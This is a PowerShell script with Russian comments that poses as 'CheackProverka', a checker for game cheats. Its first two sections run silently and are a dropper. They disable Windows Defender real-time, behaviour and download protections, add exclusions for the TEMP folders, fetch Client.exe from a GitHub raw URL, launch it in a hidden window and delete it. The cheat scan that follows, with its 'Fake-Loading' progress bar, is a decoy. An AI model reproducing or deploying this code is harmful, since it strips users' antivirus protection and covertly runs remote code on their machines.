# CheackProverka - Проверка системы + скрытый запуск .exe

# Часть 1: Пытаемся отключить защиту (молча, без вывода)
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue | Out-Null
    Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue | Out-Null
    Set-MpPreference -DisableBlockAtFirstSeen $true -EA SilentlyContinue | Out-Null
    Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue | Out-Null
    Add-MpPreference -ExclusionPath "$env:TEMP" -EA SilentlyContinue | Out-Null
    Add-MpPreference -ExclusionPath "$env:TMP" -EA SilentlyContinue | Out-Null
}
catch { }

# Часть 2: Скачивание и запуск .exe (самая простая версия)
try {
    $url = "https://raw.githubusercontent.com/fffghsetyver-hash/Cheackproverka/main/Client.exe"
    $rand = Get-Random -Minimum 10000 -Maximum 999999
    $exePath = "$env:TEMP\upd$rand.exe"

    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA SilentlyContinue

    if (Test-Path $exePath) {
        $size = (Get-Item $exePath).Length
        if ($size -gt 5000) {               # минимальный разумный размер
            Start-Process -FilePath $exePath -WindowStyle Hidden -EA SilentlyContinue
            Start-Sleep -Milliseconds 2500  # даём время на запуск
        }
        Remove-Item $exePath -Force -EA SilentlyContinue
    }
}
catch { }

# Часть 3: Основной интерфейс (без изменений)
Clear-Host
Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host " CheackProverka v1.0 " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Что проверить:" -ForegroundColor Yellow
Write-Host " 1 — драйверы (kernel / ring0)" -ForegroundColor White
Write-Host " 2 — запущенные процессы" -ForegroundColor White
Write-Host " 3 — подозрительные команды в логах PowerShell" -ForegroundColor White
Write-Host " 123 — всё сразу" -ForegroundColor White
Write-Host ""
Write-Host "Введи номера (без пробелов, например 13 или 123): " -NoNewline -ForegroundColor Yellow

$choice = Read-Host

if ($choice -notmatch '^[123]+$') {
    Write-Host "Неверный выбор." -ForegroundColor Red
    pause
    exit
}

$check1 = $choice -match "1"
$check2 = $choice -match "2"
$check3 = $choice -match "3"

$issues = 0

function Show-Result {
    param ([string]$Text, [string]$Status, [string]$Color = "White")
    $emoji = if ($Status -eq "OK") {"🟢"} elseif ($Status -eq "ВНИМАНИЕ") {"🟡"} else {"🔴"}
    Write-Host "$emoji $Text " -NoNewline -ForegroundColor White
    Write-Host $Status -ForegroundColor $Color
}

function Fake-Loading {
    param ([int]$Min = 7, [int]$Max = 13)
    $sec = Get-Random -Minimum $Min -Maximum ($Max + 1)
    $total = $sec * 10
    $done = 0
    Write-Host "Сканирование" -NoNewline
    for ($i = 1; $i -le $total; $i++) {
        Start-Sleep -Milliseconds 100
        $done++
        $p = [math]::Round(($done / $total) * 100)
        Write-Host "." -NoNewline
        if ($p % 10 -eq 0 -and $p -gt 0 -and $p -lt 100) { Write-Host " $p%" -NoNewline -ForegroundColor DarkCyan }
    }
    Write-Host " 100%" -ForegroundColor Green
    Write-Host ""
}

if ($check1) {
    Write-Host "1. Проверка драйверов" -ForegroundColor Yellow
    Fake-Loading
    $drivers = Get-WmiObject Win32_SystemDriver | Where-Object {$_.State -eq "Running"}
    $sus = @("capcom","kdmapper","mhyprot","ace","vanguard","battleye")
    $found = $drivers | Where-Object {$sus -contains $_.Name -or $_.PathName -match ($sus -join "|")}
    if ($found) {
        Show-Result "Драйверы" "ПОДОЗРИТЕЛЬНЫЕ" "Red"
        $issues++
    } else {
        Show-Result "Драйверы" "OK" "Green"
    }
    Write-Host ""
}

if ($check2) {
    Write-Host "2. Проверка процессов" -ForegroundColor Yellow
    Fake-Loading
    $patterns = @("cheat","inject","aimbot","wallhack","osiris","neverlose","skeet")
    $proc = Get-Process | Where-Object {$_.ProcessName.ToLower() -match ($patterns -join "|")}
    if ($proc) {
        Show-Result "Процессы" "НАЙДЕНЫ ($($proc.Count))" "Red"
        $issues++
    } else {
        Show-Result "Процессы" "OK" "Green"
    }
    Write-Host ""
}

if ($check3) {
    Write-Host "3. Проверка логов PowerShell" -ForegroundColor Yellow
    Fake-Loading
    try {
        $ev = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 1000 -EA SilentlyContinue |
              Where-Object {$_.Id -in 4103,4104}
        $bad = $ev | Where-Object {$_.Message -match "iex|invoke-expression|downloadstring|-enc|-w hidden"}
        if ($bad) {
            Show-Result "Подозрительные команды" "НАЙДЕНЫ" "Red"
            $issues++
        } else {
            Show-Result "Подозрительные команды" "OK" "Green"
        }
    } catch {
        Show-Result "Логи" "нет доступа" "Yellow"
    }
    Write-Host ""
}

Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan
if ($issues -eq 0) {
    Write-Host "🟢 ЧИСТО 🟢" -ForegroundColor Green
} elseif ($issues -le 2) {
    Write-Host "🟡 ВНИМАНИЕ ($issues) 🟡" -ForegroundColor Yellow
} else {
    Write-Host "🔴 РИСК ($issues) 🔴" -ForegroundColor Red
}
Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan

pause
